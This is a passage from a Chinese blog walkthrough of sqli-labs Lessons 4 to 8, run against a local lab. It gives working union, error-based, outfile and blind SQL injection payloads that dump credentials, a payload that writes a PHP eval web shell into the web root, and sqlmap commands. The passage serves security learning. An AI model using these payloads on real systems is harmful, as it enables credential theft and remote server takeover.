+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-4/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;-1\&quot;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p>去掉用于引用报错信息的单引号<code>&quot;-1\&quot;) LIMIT 0,1</code> 我们可以知道，此时的sql语句是用双引号和括号闭合的</p>
+<h3 id="判断字段数-4">判断字段数</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) order by 3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:</strong></p>
+<p><img src="Untitled%2043.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:可以判断字段数为3</strong></p>
+<p><img src="Untitled%2044.png" alt="Untitled"></p>
+<h3 id="判断回显位置-4">判断回显位置</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上</strong></p>
+<p><img src="Untitled%2045.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-4">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：查询到当前数据库名称为security</strong></p>
+<p><img src="Untitled%2046.png" alt="Untitled"></p>
+<h3 id="爆破表名-4">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2047.png" alt="Untitled"></p>
+<h3 id="爆破字段名-4">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名id,username,password</strong></p>
+<p><img src="Untitled%2048.png" alt="Untitled"></p>
+<h3 id="爆破数据-4">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到所有数据，第四关结束</strong></p>
+<p><img src="Untitled%2049.png" alt="Untitled"></p>
+<h1>报错注入</h1>
+<h2 id="Less-5：GET-Double-Injection-single-Quotes-String">Less-5：GET -Double Injection -single Quotes -String</h2>
+<h3 id="界面-5">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2050.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2051.png" alt="Untitled"></p>
+<h3 id="判断注入点-5">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%2052.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1\<span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p>去掉用于引用报错信息的单引号<code>'-1\' LIMIT 0,1</code> 我们可以知道，此时的sql语句是用单引号闭合的</p>
+<h3 id="判断字段数-5">判断字段数</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:</strong></p>
+<p><img src="Untitled%2053.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:可以判断字段数为3</strong></p>
+<p><img src="Untitled%2054.png" alt="Untitled"></p>
+<h3 id="判断回显位置-5">判断回显位置</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：发现并没有回显，但是我们可以发现前面会有显示报错信息，因此我们可以采用报错注入</strong></p>
+<p><img src="Untitled%2055.png" alt="Untitled"></p>
+<h3 id="关于报错注入"><strong>关于报错注入</strong></h3>
+<p>所谓的报错注入就是利用报错信息回显，把想要的结果显示在报错信息中</p>
+<p>因此，使用<strong>报错注入的前提就是页面会显示报错信息</strong></p>
+<p>就说说我最常用的一种报错注入的方式吧，其他的大家可以自行学习</p>
+<p><strong>利用xpath语法错误注入</strong></p>
+<ul>
+<li>适用版本：mysql版本号大于5.1.5</li>
+<li>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue（）和updatexml（）</li>
+<li>Extractvalue（）负责在xml文档中按照xpath语法查询节点内容</li>
+<li>updatexml（）则负责修改查询到的内容</li>
+<li>用法：这两个函数的第二个参数都要求是符合xpath语法的字符串，如果不满足要求就会报错，并且<strong>会把查询结果放在报错信息里</strong>。</li>
+</ul>
+<p>比如：</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select -1 and updatexml(1,concat(0x7e,database()),1)</span><br></pre></td></tr></table></figure>
+<p><strong>结果：因为我们的第二个参数并不符合xpath语法的要求，所以产生报错执行第二个参数的语句</strong></p>
+<p><img src="Untitled%2056.png" alt="Untitled"></p>
+<p>所以这题我们就可以利用报错注入</p>
+<h3 id="爆破数据库名-5">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名security</strong></p>
+<p><img src="Untitled%2057.png" alt="Untitled"></p>
+<h3 id="爆破表名-5">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2058.png" alt="Untitled"></p>
+<h3 id="爆破字段名-5">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名id,username,password</strong></p>
+<p><img src="Untitled%2059.png" alt="Untitled"></p>
+<h3 id="爆破数据-5">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到（部分）数据，其实与之前的数据相比就能看出来这次得到的数据是不完全的</strong></p>
+<p><img src="Untitled%2060.png" alt="Untitled"></p>
+<p><strong>那么为什么我们回显的数据不完全呢？</strong></p>
+<p>因为updatexml() 函数和extractvalue()的报错内容长度不能超过 32 个字符，所以需要我们对结果进行处理，可以让我们多次拿出我们想要的数据</p>
+<p><strong>我们应该如何处理？</strong></p>
+<p>可以使用mid(),left(),substring()函数来对结果字符串进行处理，这里以substring进行演示</p>
+<h3 id="关于substring">关于substring</h3>
+<p><strong>SUBSTRING ( expression, start, length )</strong></p>
+<ul>
+<li><strong>expression</strong>
+<ul>
+<li>字符串、二进制字符串、文本、图像、列或包含列的表达式。请勿使用包含聚合函数的表达式。</li>
+</ul>
+</li>
+<li><strong>start</strong>
+<ul>
+<li>整数或可以隐式转换为 int 的表达式，指定子字符串的开始位置，索引是从1开始。</li>
+</ul>
+</li>
+<li><strong>length</strong>
+<ul>
+<li>整数或可以隐式转换为 int 的表达式，指定子字符串的长度。经测试，暂且发现<strong>只能是非负数</strong></li>
+</ul>
+</li>
+</ul>
+<p>就拿我们当前的题目举例，给结果加上substring，我们现在只取第一个字符</p>
+<p>也就是相应的应该为substring(xxx,1,1)，也就是将结果从第一位开始取，取1位</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,1)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：只有第一位字符D</strong></p>
+<p><img src="Untitled%2061.png" alt="Untitled"></p>
+<p>那么我们知道，报错信息只能输出32位，相当于以下语句</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,32)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：和不加这个substring是一样的</strong></p>
+<p><img src="Untitled%2062.png" alt="Untitled"></p>
+<p>而现在我们想要得到后面的数据，(因为我们<strong>前面还有一个0x7e</strong>，所以后面的字符只显示31位，也就是说默认显示的数据是**（~+1-31位的数据）<strong>，前面的0x7e</strong>去掉也没问题**)所以我们需要从第32位开始，只需要将开始位改为32即可，即substring(xxx,32,32)</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),32,32)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到后面的部分结果，因此我们可以利用这个方法得到所有数据，后面不再演示，第五关结束</strong></p>
+<p><img src="Untitled%2063.png" alt="Untitled"></p>
+<h2 id="Less-6：GET-Double-injection-Double-Quotes-string">Less-6：GET -Double injection -Double Quotes -string</h2>
+<h3 id="界面-6">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2064.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2065.png" alt="Untitled"></p>
+<p>可以看到这次界面上依旧没有回显，基本可以确定不能使用联合查询注入</p>
+<h3 id="判断注入点-6">判断注入点</h3>
+<p>使用’或\来判断是否存在注入点</p>
+<p><img src="Untitled%2066.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-6/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure>
+<p><strong>报错信息：存在报错信息，说明可以使用报错注入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;-1\&quot; LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure>
+<p>去掉用于引用报错信息的单引号<code>&quot;-1\&quot; LIMIT 0,1</code> 我们可以知道，此时的sql语句是双引号闭合的</p>
+<h3 id="爆破数据库名-6">爆破数据库名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,database()),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名security</strong></p>
+<p><img src="Untitled%2067.png" alt="Untitled"></p>
+<h3 id="爆破表名-6">爆破表名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到表名emails,referers,uagents,users</strong></p>
+<p><img src="Untitled%2068.png" alt="Untitled"></p>
+<h3 id="爆破字段名-6">爆破字段名</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功得到字段名id,username,password</strong></p>
+<p><img src="Untitled%2069.png" alt="Untitled"></p>
+<h3 id="爆破数据-6">爆破数据</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,32)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到（部分）数据,第六关结束</strong></p>
+<p><img src="Untitled%2070.png" alt="Untitled"></p>
+<h1>写入文件</h1>
+<h2 id="Less-7：GET-Dump-into-outfile-string">Less-7：GET -Dump into outfile -string</h2>
+<h3 id="界面-7">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2071.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2072.png" alt="Untitled"></p>
+<p>得到的基础信息是，无回显，无具体的报错信息，那么可能我们的联合查询注入和报错注入都不能使用</p>
+<h3 id="判断注入点-7">判断注入点</h3>
+<p>通过页面不同的反馈来判断注入点和闭合方式，我们知道如果未能将引号闭合时，会发生报错</p>
+<p>也就是说若是闭合方式中有我们尝试的字符，就会报错，如果没有就不会报错。</p>
+<p>而报错和不报错页面都在上面了，我们开始尝试</p>
+<p><strong>先看最内层是单引号还是双引号</strong></p>
+<p><strong>payload：单引号</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：其实已经可以看出闭合方式中含有单引号了，我们继续试一下双引号</strong></p>
+<p><img src="Untitled%2073.png" alt="Untitled"></p>
+<p><strong>payload：双引号</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：未报错，说明不含双引号</strong></p>
+<p><img src="Untitled%2074.png" alt="Untitled"></p>
+<p>此时我们判断出，闭合方式中含有单引号，我们假设只有单引号，加上<code>or 1=1 —+</code> 如果完全闭合将不会报错，若未完全闭合，就会报错</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：报错，说明未完全闭合</strong></p>
+<p><img src="Untitled%2075.png" alt="Untitled"></p>
+<p>我们继续尝试，直到不报错即可，最后判断出闭合方式为一个单引号和两个括号</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：未报错，判断闭合方式成功</strong></p>
+<p><img src="Untitled%2076.png" alt="Untitled"></p>
+<p>但是，没有回显不能用联合注入，没有精确的报错信息无法使用报错注入，我们应该如何呢？</p>
+<p>可以看到，不报错的页面有一个提示<code>Use outfile</code> ，我们可以联想到sql语句中的<strong>into outfile</strong></p>
+<h3 id="关于into-outfile">关于<strong>into outfile</strong></h3>
+<p><strong>sql语句中into outfile函数可以将文件导入到数据库的目录中</strong></p>
+<p>在演示之前，我们需要知道完成<strong>into outfile</strong>操作需要满足三点要求</p>
+<ul>
+<li>1.具有root权限。</li>
+<li>2.在数据库配置文件中的 配置项含有：secure_file_priv=‘’。（注意在数据库中此项默认为secure_file_priv=null）</li>
+<li>3.知道数据库的绝对路径。</li>
+</ul>
+<p>第一点，我们在搭建靶场时就是使用的root连接的数据库，所以第一点我们已经满足了</p>
+<p>第二点我们需要手动修改，<strong>首先使用命令行连接mysql数据库</strong><br>
+如果没有添加环境变量可以到我们phpstudy的mysql文件位置</p>
+<p><img src="Untitled%2077.png" alt="Untitled"></p>
+<p>然后进入到bin目录下</p>
+<p><img src="Untitled%2078.png" alt="Untitled"></p>
+<p><code>shift+右键</code>打开命令行，输入密码连接数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2079.png" alt="Untitled"></p>
+<p>查看secure_file_priv配置，如果为null则无法进行文件导出操作，默认为null</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2080.png" alt="Untitled"></p>
+<p>打开<code>mysql</code>下的<code>my.ini</code></p>
+<p><img src="Untitled%2081.png" alt="Untitled"></p>
+<p>将<code>secure_file_priv=&quot;/&quot;</code>  添加到配置文件</p>
+<p><img src="Untitled%2082.png" alt="Untitled"></p>
+<p>此时重启mysql服务，然后再次查询，发现已经成功了，此时我们已经对C:\目录下的所有文件具有写入权限了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2083.png" alt="Untitled"></p>
+<p>此时我们可以写入以下试试</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 into outfile <span class="string">&quot;C:\\phpStudy\\1.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：成功写入</strong></p>
+<p><img src="Untitled%2084.png" alt="Untitled"></p>
+<p><img src="Untitled%2085.png" alt="Untitled"></p>
+<p>但是一般情况下，可以写入的目录不可能是整个C盘，一般只是在Mysql的目录下，或者其他特定目录比如phpStudy目录下的WWW目录。这就需要我们需要其他方式获得可以写入文件的路径</p>
+<p>比如可以通过有回显的页面获取，我们可以去到less-1</p>
+<p>使用查询<code>@@basedir,@@datadir</code> 来确定MySQL的基础目录和数据目录，</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,@@basedir,@@datadir--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到可写入目录<code>C:/phpStudy/MySQL/</code> 和<code>C:\phpStudy\MySQL\data\</code>，但一般能通过这种方式找到写入目录，我们也可以得到数据库中的其他数据，因此这种情形应用场景还是比较有限的，现在我们就模拟拥有对phpStudy的WWW目录的写入权限</strong></p>
+<p><img src="Untitled%2086.png" alt="Untitled"></p>
+<h3 id="写入木马">写入木马</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &quot;C:\\phpStudy\\WWW\\shell.php&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：报错,需要访问shell.php来确定写入是否成功</strong></p>
+<p><img src="Untitled%2087.png" alt="Untitled"></p>
+<p><strong>访问shell.php：</strong></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/shell.php</span><br></pre></td></tr></table></figure>
+<p><strong>结果：写入成功</strong></p>
+<p><img src="Untitled%2088.png" alt="Untitled"></p>
+<h3 id="使用蚁剑连接木马">使用蚁剑连接木马</h3>
+<p>连接成功</p>
+<p><img src="Untitled%2089.png" alt="Untitled"></p>
+<p><strong>也可以利用此办法将数据写入这种可访问的文件</strong></p>
+<h3 id="将数据写入可访问的文件"><strong>将数据写入可访问的文件</strong></h3>
+<p><strong>payload：将数据写入result.txt</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;)) union select 1,2,group_concat(username,0x7e,password)from users into outfile &quot;C:\\phpStudy\\WWW\\result.txt&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：访问result.txt，第七关结束</strong></p>
+<p><img src="Untitled%2090.png" alt="Untitled"></p>
+<h1>盲注</h1>
+<h2 id="Less-8：GET-Blind-Boolian-Based-single-Quotes">Less-8：GET -Blind -Boolian Based -single Quotes</h2>
+<h3 id="界面-8">界面</h3>
+<p>在url中加入<code>?id=1</code></p>
+<p><img src="Untitled%2091.png" alt="Untitled"></p>
+<p>在url中加入<code>?id=-1</code></p>
+<p><img src="Untitled%2092.png" alt="Untitled"></p>
+<p>没有回显，没有报错信息，但真和假条件的页面不同，可以采用盲注</p>
+<h3 id="判断注入点-8">判断注入点</h3>
+<p>使用’来判断是否存在注入点</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?<span class="built_in">id</span>=1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果:报错说明其中含有单引号，注释掉后面的单引号，看是否报错</strong></p>
+<p><img src="Untitled%2093.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?<span class="built_in">id</span>=1<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：不报错，说明闭合方式为单引号</strong></p>
+<p><img src="Untitled%2094.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-7">爆破数据库名</h3>
+<p><strong>payload：and两端都为真，整体结果才为真</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27; and ascii(substring((select database()),1,1))&gt;1--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：可以真假页面显示的不同来判断我们构造的条件是否正确，</strong><code>scii(substring((select database()),1,1))&gt;1</code> 为真</p>
+<p><img src="Untitled%2095.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27; and ascii(substring((select database()),1,1))&gt;128--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong><code>ascii(substring((select database()),1,1))&gt;128--+</code> 为假</p>
+<p><img src="Untitled%2096.png" alt="Untitled"></p>
+<p>我们可以使用这种方式并结合<strong>二分法</strong>来快速猜取数据库名，表名等</p>
+<p>最终得到数据库名为<strong>security</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (select database())=&quot;security&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：数据库名为security</strong></p>
+<p><img src="Untitled%2097.png" alt="Untitled"></p>
+<p>当然，这种方法还是有些麻烦，我们可以借助工具和脚本来完成，这里演示一下使用**<code>sqlmap</code>**进行爆破</p>
+<h3 id="使用Sqlmap进行GET类型注入">使用Sqlmap进行GET类型注入</h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 </span><br></pre></td></tr></table></figure>
+<ul>
+<li>-u 表示要进行注入的地方</li>
+</ul>
+<p><strong>结果：得到此get注入的存在的注入类型为布尔盲注</strong></p>
+<p><img src="Untitled%2098.png" alt="Untitled"></p>
+<h3 id="使用Sqlmap爆破数据库名称">使用Sqlmap爆破数据库名称</h3>
+<p><strong>payload：在刚刚的基础上加入—dbs/—current-db</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 --dbs</span><br></pre></td></tr></table></figure>
+<ul>
+<li>–dbs 对所有数据库名称进行爆破</li>
+<li>–current-db对当前使用数据库机型爆破</li>
+</ul>
+<p><strong>结果：得到数据库名security</strong></p>
+<p><img src="Untitled%2099.png" alt="Untitled"></p>
+<h3 id="使用Sqlmap爆破表名称"><strong>使用Sqlmap爆破表名称</strong></h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security --tables</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-D 指定数据库</li>
+<li>–tables 对表名进行爆破</li>
+</ul>
+<p><strong>结果：得到表名users</strong></p>
+<p><img src="Untitled%20100.png" alt="Untitled"></p>
+<h3 id="使用Sqlmap爆破字段名称"><strong>使用Sqlmap爆破字段名称</strong></h3>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-T 指定表名</li>
+<li>–columns 对字段名进行爆破</li>
+</ul>
+<p><strong>结果：得到字段名</strong></p>
+<p><img src="Untitled%20101.png" alt="Untitled"></p>
+<h3 id="使用Sqlmap爆破数据"><strong>使用Sqlmap爆破数据</strong></h3>
+<p><strong>payload</strong></p>
